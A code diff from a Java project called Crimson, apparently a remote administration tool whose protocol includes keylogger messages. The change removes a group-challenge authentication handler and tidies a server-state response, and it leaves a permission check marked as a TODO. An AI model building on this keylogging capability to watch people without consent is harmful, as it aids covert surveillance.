@@ -21,17 +21,11 @@ import java.util.Date;
 
 import com.subterranean_security.crimson.core.attribute.keys.singular.AK_SERVER;
 import com.subterranean_security.crimson.core.net.Connector;
-import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
-import com.subterranean_security.crimson.core.net.auth.KeyAuthGroup;
 import com.subterranean_security.crimson.core.net.executor.temp.ExeI;
 import com.subterranean_security.crimson.core.net.executor.temp.Exelet;
 import com.subterranean_security.crimson.core.store.NetworkStore;
-import com.subterranean_security.crimson.core.store.ProfileStore;
-import com.subterranean_security.crimson.core.util.CryptoUtil;
 import com.subterranean_security.crimson.core.util.ProtoUtil.PDFactory;
 import com.subterranean_security.crimson.proto.core.Misc.Outcome;
-import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RQ_GroupChallenge;
-import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RS_GroupChallenge;
 import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.RQ_KeyUpdate;
 import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.RS_KeyUpdate;
@@ -39,12 +33,11 @@ import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogFile;
 import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogType;
 import com.subterranean_security.crimson.proto.core.net.sequences.Log.RS_Logs;
 import com.subterranean_security.crimson.proto.core.net.sequences.MSG.Message;
-import com.subterranean_security.crimson.proto.core.net.sequences.State.RS_ChangeServerState;
 import com.subterranean_security.crimson.sc.Logsystem;
-import com.subterranean_security.crimson.server.store.AuthStore;
 import com.subterranean_security.crimson.server.store.ListenerStore;
 import com.subterranean_security.crimson.sv.permissions.Perm;
 import com.subterranean_security.crimson.sv.profile.ClientProfile;
+import com.subterranean_security.crimson.sv.store.ProfileStore;
 import com.subterranean_security.crimson.universal.Universal;
 
 public class MiscExe extends Exelet implements ExeI {
@@ -89,25 +82,6 @@ public class MiscExe extends Exelet implements ExeI {
 
 	}
 
-	public void rq_key_challenge(Message m) {
-		if (connector.getState() != ConnectionState.AUTH_STAGE2) {
-			return;
-		}
-		RQ_GroupChallenge rq = m.getRqGroupChallenge();
-		KeyAuthGroup group = AuthStore.getGroup(rq.getGroupName());
-
-		RS_GroupChallenge rs = RS_GroupChallenge.newBuilder()
-				.setResult(CryptoUtil.signGroupChallenge(rq.getMagic(), group.getPrivateKey())).build();
-		connector.write(Message.newBuilder().setId(m.getId()).setRsGroupChallenge(rs).build());
-		try {
-			Thread.sleep(100);
-		} catch (InterruptedException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-
-	}
-
 	public void rq_change_server_state(Message m) {
 		// TODO check permissions
 		String comment = "";
@@ -130,8 +104,8 @@ public class MiscExe extends Exelet implements ExeI {
 			break;
 		}
 
-		connector.write(Message.newBuilder().setId(m.getId()).setRsChangeServerState(RS_ChangeServerState.newBuilder()
-				.setOutcome(Outcome.newBuilder().setResult(result).setComment(comment))).build());
+		connector.write(Message.newBuilder().setId(m.getId())
+				.setRsOutcome(Outcome.newBuilder().setResult(result).setComment(comment)));
 
 		// apprise viewers
 		NetworkStore.broadcastTo(Universal.Instance.VIEWER,
